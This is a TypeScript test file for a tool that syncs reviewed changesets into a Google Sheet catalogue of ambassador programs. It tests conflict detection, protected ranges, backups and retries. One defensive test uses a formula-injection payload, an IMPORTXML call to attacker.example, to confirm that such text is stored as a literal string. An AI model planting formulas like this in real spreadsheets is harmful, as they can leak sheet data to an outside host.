import { mkdtempSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { newChangeset, type Change } from '../src/maintainer/changeset.js';
import { ProtectedRangeError, SheetsClient } from '../src/maintainer/sheets-client.js';
import { applyChangeset, makeBackup, planChangeset, readSheetState, restoreChangeset, verifyBackup } from '../src/maintainer/sync.js';
import { ConflictError } from '../src/errors.js';
import { CliError } from '../src/errors.js';
import { parseCatalogCsv } from '../src/records.js';
import type { Opportunity } from '../src/schema.js';
import type { FakeSheets } from './helpers/fake-sheets.js';
import { CATALOG_CSV, OWNER_TOKEN, startFakeSheets } from './helpers/fixtures.js';

const ID_COL = 21;
const TAB = 'Opportunities';
let fake: FakeSheets | undefined;

afterEach(async () => {
  await fake?.stop();
  fake = undefined;
});

const reviewed = { kind: 'sheets-api', fetchedAt: '2026-09-25T00:00:00Z', url: 'test' };
const backupDir = () => mkdtempSync(join(tmpdir(), 'ambassador-backups-'));

function update(id: string, fields: Record<string, { from: string; to: string }>): Change {
  return { action: 'update', id, fields };
}

const newRecord: Opportunity = {
  id: 'example-campus-builders',
  company: 'Example Co',
  program: 'Campus Builders',
  category: 'AI',
  description: 'Student builders run workshops.',
  url: 'https://example.com/campus',
  status: 'Needs verification',
  deadline: '2026-11-01',
  deadlineNotes: 'Deadline 11:59 pm PT per page.',
  programDates: '',
  workload: '',
  ambassadorBenefits: '',
  communityBenefits: '',
  expectations: '',
  eligibility: '',
  geography: '',
  localApplicability: '',
  restrictions: '',
  assessment: 'Needs clarification',
  assessmentReason: 'New entry; verify benefits.',
  sourceIds: ['example-campus'],
  lastChecked: '2026-09-25',
};

function writtenCells(f: FakeSheets): { row: number; col: number }[] {
  return f.writeRequests.flatMap((r) =>
    ((r.body as { requests: any[] }).requests ?? []).flatMap((q) =>
      q.updateCells ? [{ row: q.updateCells.start.rowIndex, col: q.updateCells.start.columnIndex }] : [],
    ),
  );
}

describe('sync against a Sheets API server', () => {
  it('writes only changed cells, never the stable ID column, backs up first and reads back', async () => {
    const s = await startFakeSheets();
    fake = s.fake;
    const cs = newChangeset(reviewed, [update('cursor-ambassadors', { workload: { from: 'Regular involvement; hours not published.', to: 'About 2 hours/week.' } })], []);
    const dir = backupDir();
    const result = await applyChangeset(s.client, TAB, cs, { backupDir: dir });
    expect(result.readbackProblems).toEqual([]);
    expect(result.plan.writes).toHaveLength(1);
    expect(writtenCells(fake)).toEqual([{ row: 1, col: 9 }]);
    expect(writtenCells(fake).some((c) => c.col === ID_COL)).toBe(false);
    expect(fake.writeRequests).toHaveLength(1);
    expect(readdirSync(dir)).toHaveLength(1);
    const after = await readSheetState(s.client, TAB);
    expect(after.opportunities.table.records.find((r) => r.id === 'cursor-ambassadors')?.workload).toBe('About 2 hours/week.');
  });

  it('is idempotent: re-applying the same changeset writes nothing and makes no backup', async () => {
    const s = await startFakeSheets();
    fake = s.fake;
    const cs = newChangeset(reviewed, [update('cursor-ambassadors', { workload: { from: 'Regular involvement; hours not published.', to: 'About 2 hours/week.' } })], []);
    await applyChangeset(s.client, TAB, cs, { backupDir: backupDir() });
    const dir = backupDir();
    const again = await applyChangeset(s.client, TAB, cs, { backupDir: dir });
    expect(again.written).toBe(0);
    expect(again.backupFile).toBeNull();
    expect(readdirSync(dir)).toHaveLength(0);
    expect(fake.writeRequests).toHaveLength(1);
  });

  it('rejects a changeset when a person edited the field after review, writing nothing', async () => {
    const s = await startFakeSheets();
    fake = s.fake;
    fake.edit(TAB, 1, 9, { string: 'Edited by hand in the Sheet.' });
    const cs = newChangeset(reviewed, [update('cursor-ambassadors', { workload: { from: 'Regular involvement; hours not published.', to: 'About 2 hours/week.' } })], []);
    await expect(applyChangeset(s.client, TAB, cs, { backupDir: backupDir() })).rejects.toThrow(ConflictError);
    expect(fake.writeRequests).toHaveLength(0);
  });

  it('aborts when the Sheet changes between planning and the pre-write re-read', async () => {
    const s = await startFakeSheets();
    fake = s.fake;
    const f = fake;
    // readSheetState makes two value reads; edit right after the first state is read.
    f.afterRead = (n) => {
      if (n === 2) f.edit(TAB, 2, 16, { string: 'Concurrent edit.' });
    };
    const cs = newChangeset(reviewed, [update('cursor-ambassadors', { workload: { from: 'Regular involvement; hours not published.', to: 'About 2 hours/week.' } })], []);
    await expect(applyChangeset(s.client, TAB, cs, { backupDir: backupDir() })).rejects.toThrow(/changed while sync was preparing/);
    expect(fake.writeRequests).toHaveLength(0);
  });

  it('stores formula-like text as a literal string, not a formula', async () => {
    const s = await startFakeSheets();
    fake = s.fake;
    const evil = '=IMPORTXML("https://attacker.example/x","//a")';
    const cs = newChangeset(reviewed, [update('cursor-ambassadors', { description: { from: 'Help developers learn Cursor and organize community activities.', to: evil } })], []);
    await applyChangeset(s.client, TAB, cs, { backupDir: backupDir() });
    const req = (fake.writeRequests[0]!.body as { requests: any[] }).requests[0];
    expect(req.updateCells.rows[0].values[0].userEnteredValue).toEqual({ stringValue: evil });
    const state = await readSheetState(s.client, TAB);
    expect(state.opportunities.table.records.find((r) => r.id === 'cursor-ambassadors')?.description).toBe(evil);
    const backup = makeBackup({ spreadsheetId: 'x', tab: TAB, origin: 'sheets-api', grid: state.opportunities.grid, formulas: state.opportunities.formulas });
    expect(backup.opportunities.formulaCells).toEqual([]);
  });

  it('appends a new record and its source through the table, with date serials', async () => {
    const s = await startFakeSheets();
    fake = s.fake;
    const cs = newChangeset(reviewed, [{ action: 'add', id: newRecord.id, record: newRecord }], [
      { id: 'example-campus', url: 'https://example.com/campus', supports: 'Program page', lastChecked: '2026-09-25' },
    ]);
    const result = await applyChangeset(s.client, TAB, cs, { backupDir: backupDir() });
    expect(result.readbackProblems).toEqual([]);
    const reqs = (fake.writeRequests[0]!.body as { requests: any[] }).requests;
    expect(reqs[0].appendCells.tableId).toBe('1510487007');
    expect(reqs[0].appendCells.rows[0].values[5].userEnteredValue).toEqual({ numberValue: 46327 });
    const again = await applyChangeset(s.client, TAB, cs, { backupDir: backupDir() });
    expect(again.written).toBe(0);
    const state = await readSheetState(s.client, TAB);
    expect(state.opportunities.table.records.filter((r) => r.id === newRecord.id)).toHaveLength(1);
    expect(state.sources?.byId.has('example-campus')).toBe(true);
  });

  it('reports a protected stable-ID column as a clear error and writes nothing, while updates still work', async () => {
    const s = await startFakeSheets([{ sheetId: 1872724035, startRow: 1, startCol: ID_COL, endCol: ID_COL, editors: [OWNER_TOKEN] }]);
    fake = s.fake;
    const add = newChangeset(reviewed, [{ action: 'add', id: newRecord.id, record: newRecord }], []);
    const err = await applyChangeset(s.client, TAB, add, { backupDir: backupDir() }).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(ProtectedRangeError);
    expect(String((err as Error).message)).toMatch(/Nothing was written/);
    expect(String((err as Error).message)).toMatch(/new example-campus-builders Opportunity ID\) is in protected range/);
    // Preflight stops before any backup or write request.
    expect(fake.writeRequests).toHaveLength(0);
    // If a write reaches Google anyway, its protected-cell rejection maps to the same error.
    const direct = await s.client
      .batchUpdate([{ updateCells: { start: { sheetId: 1872724035, rowIndex: 1, columnIndex: ID_COL }, rows: [{ values: [{ userEnteredValue: { stringValue: 'x' } }] }], fields: 'userEnteredValue' } }])
      .catch((e: unknown) => e);
    expect(direct).toBeInstanceOf(ProtectedRangeError);
    expect((await readSheetState(s.client, TAB)).opportunities.table.records).toHaveLength(13);
    const upd = newChangeset(reviewed, [update('nvidia-dli-educator', { workload: { from: (await readSheetState(s.client, TAB)).opportunities.table.records.find((r) => r.id === 'nvidia-dli-educator')!.workload, to: 'Varies by course.' } })], []);
    const ok = await applyChangeset(s.client, TAB, upd, { backupDir: backupDir() });
    expect(ok.readbackProblems).toEqual([]);
  });

  it('rejects an add whose ID already exists with different values, and changes to stable IDs', async () => {
    const s = await startFakeSheets();
    fake = s.fake;
    const current = (await readSheetState(s.client, TAB)).opportunities.table.records[0]!;
    const plan = planChangeset(
      newChangeset(reviewed, [{ action: 'add', id: current.id, record: { ...current, workload: 'different' } }, update('openai-campus-network', { id: { from: 'openai-campus-network', to: 'renamed' } })], []),
      await readSheetState(s.client, TAB),
    );
    expect(plan.conflicts).toHaveLength(2);
  });

  it('restores a backup by stable ID and never deletes records added since', async () => {
    const s = await startFakeSheets();
    fake = s.fake;
    const before = await readSheetState(s.client, TAB);
    const backup = makeBackup({ spreadsheetId: 'x', tab: TAB, origin: 'sheets-api', grid: before.opportunities.grid, formulas: before.opportunities.formulas, sources: before.sources?.grid });
    await applyChangeset(
      s.client,
      TAB,
      newChangeset(reviewed, [update('cursor-ambassadors', { status: { from: 'Rolling', to: 'Closed' } }), { action: 'add', id: newRecord.id, record: newRecord }], []),
      { backupDir: backupDir() },
    );
    const mid = await readSheetState(s.client, TAB);
    const { changeset, extraIds } = restoreChangeset(backup, mid.opportunities.table, mid.sources);
    expect(extraIds).toEqual([newRecord.id]);
    expect(changeset.changes).toEqual([update('cursor-ambassadors', { status: { from: 'Closed', to: 'Rolling' } })]);
    const res = await applyChangeset(s.client, TAB, changeset, { backupDir: backupDir() });
    expect(res.readbackProblems).toEqual([]);
    const after = await readSheetState(s.client, TAB);
    expect(after.opportunities.table.records.find((r) => r.id === 'cursor-ambassadors')?.status).toBe('Rolling');
    expect(after.opportunities.table.records.some((r) => r.id === newRecord.id)).toBe(true);
  });

  it('refuses tampered backups and backups containing formulas', async () => {
    const s = await startFakeSheets();
    fake = s.fake;
    const st = await readSheetState(s.client, TAB);
    const b = makeBackup({ spreadsheetId: 'x', tab: TAB, origin: 'sheets-api', grid: st.opportunities.grid, formulas: st.opportunities.formulas });
    const tampered = { ...b, opportunities: { ...b.opportunities, values: b.opportunities.values.slice(0, 5) } };
    expect(() => verifyBackup(tampered)).toThrow(/checksum/);
    const formulas = st.opportunities.grid.map((row) => [...row]);
    formulas[1]![0] = '=HYPERLINK("x")';
    const withFormula = makeBackup({ spreadsheetId: 'x', tab: TAB, origin: 'sheets-api', grid: st.opportunities.grid, formulas });
    expect(() => restoreChangeset(withFormula, st.opportunities.table, null)).toThrow(CliError);
  });

  it('retries Sheets quota errors (429) but never retries an ambiguous write failure', async () => {
    process.env.AMBASSADOR_SHEETS_API_BASE = 'http://127.0.0.1:9/v4';
    const statuses: number[] = [];
    const client = (seq: number[]) =>
      new SheetsClient('sheet-id-for-retry-test-000', { principal: 'p', getToken: async () => 't' }, (async () => {
        const status = seq.shift() ?? 500;
        statuses.push(status);
        return new Response(JSON.stringify(status === 200 ? { replies: [] } : { error: { code: status, message: 'x' } }), { status, headers: { 'retry-after': '0' } });
      }) as typeof fetch);
    const req = [{ updateCells: { start: { sheetId: 1, rowIndex: 1, columnIndex: 1 }, rows: [{ values: [{}] }], fields: 'userEnteredValue' as const } }];
    await client([429, 429, 200]).batchUpdate(req);
    expect(statuses).toEqual([429, 429, 200]);
    statuses.length = 0;
    await expect(client([503, 200]).batchUpdate(req)).rejects.toThrow(/HTTP 503/);
    expect(statuses).toEqual([503]);
  });

  it('plans record changes and reports source rows it cannot write when there is no Sources tab', () => {
    const table = parseCatalogCsv(CATALOG_CSV);
    const plan = planChangeset(
      newChangeset(reviewed, [update('cursor-ambassadors', { workload: { from: 'Regular involvement; hours not published.', to: 'About 2 hours/week.' } })], [
        { id: 'x-source', url: 'https://example.com', supports: 's', lastChecked: '2026-09-25' },
      ]),
      { opportunities: { table } as never, sources: null },
    );
    expect(plan.writes).toHaveLength(1);
    expect(plan.notes.join(' ')).toMatch(/Sources/);
  });
});
